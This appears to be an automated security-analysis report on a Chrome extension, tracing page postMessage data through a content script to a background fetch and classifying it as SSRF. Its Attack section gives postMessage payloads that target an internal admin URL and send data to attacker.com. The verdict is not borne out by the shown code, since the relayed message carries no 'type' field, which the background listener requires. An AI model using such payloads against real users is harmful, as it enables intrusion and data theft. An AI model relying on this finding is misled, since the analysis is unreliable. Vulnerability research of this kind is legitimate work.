# CoCo Analysis: iipanfdabmcfggdjhibapfgbnbaeoohh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iipanfdabmcfggdjhibapfgbnbaeoohh/opgen_generated_files/cs_0.js
Line 1261    window.addEventListener('message',function(event) {
Line 1262        if (typeof event.data.message != "undefined") {
Line 1270            if (typeof event.data.url != "undefined") {
Line 1270                url = event.data.url;
```

**Code:**

```javascript
// Content script (cs_0.js) - lines 1261-1294
window.addEventListener('message',function(event) {
    if (typeof event.data.message != "undefined") {
        var url = '';
        // ... other variables ...
        if (typeof event.data.url != "undefined") {
            url = event.data.url; // ← attacker-controlled URL
        }
        // ... extract other fields ...

        // Send message to background with attacker-controlled URL
        chrome.runtime.sendMessage({
            title: config.website_name,
            message: event.data.message,
            url: url, // ← attacker-controlled
            context_message: context_message,
            button_name_1: button_name_1,
            button_url_1: button_url_1,
            button_name_2: button_name_2,
            button_url_2: button_url_2,
            badge_text: badge_text
        }, function(response) { });
    }
}, true);

// Background script (bg.js) - lines 973-995
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    new Promise((resolve, reject) => {
        console.log(request.url);
        if (typeof request !== 'object' || !request.type) {
            console.error('参数异常');
            reject(`消息 ${JSON.stringify(request)} 格式不符合规范`);
            return;
        }
        switch (request.type) {
            case 'get':
                fetch(request.url).then((res) => { // ← SSRF sink with attacker-controlled URL
                    resolve(res.json());
                });
                break;
            case 'test':
                resolve('测试');
                break;
        }
    }).then((res) => {
        sendResponse(res); // ← Response sent back to content script
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** postMessage from webpage to content script

**Attack:**

```javascript
// Malicious webpage sends crafted postMessage
window.postMessage({
    message: "trigger",
    type: "get",
    url: "http://internal-network.local/admin/secrets"  // SSRF to internal network
}, "*");

// Or exfiltrate data to attacker server
window.postMessage({
    message: "trigger",
    type: "get",
    url: "https://attacker.com/collect?data=stolen"
}, "*");

// The extension will perform privileged fetch with extension's permissions
// bypassing CORS and accessing internal resources
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker can force the extension to make privileged HTTP requests to arbitrary URLs, including internal network resources that would normally be blocked by CORS. The extension has host_permissions for `*://*.leftiontrans.com/*` and `*://buyertrade.taobao.com/*`, plus permissions for `http://localhost:8080/api/wx/`, `https://ectbuy.my/`, and `https://ectou.net/`. The attacker can abuse the extension's elevated privileges to access internal services, exfiltrate data to attacker-controlled servers, or scan internal networks. The response from the fetch is sent back via sendResponse, allowing the attacker to read the response data.
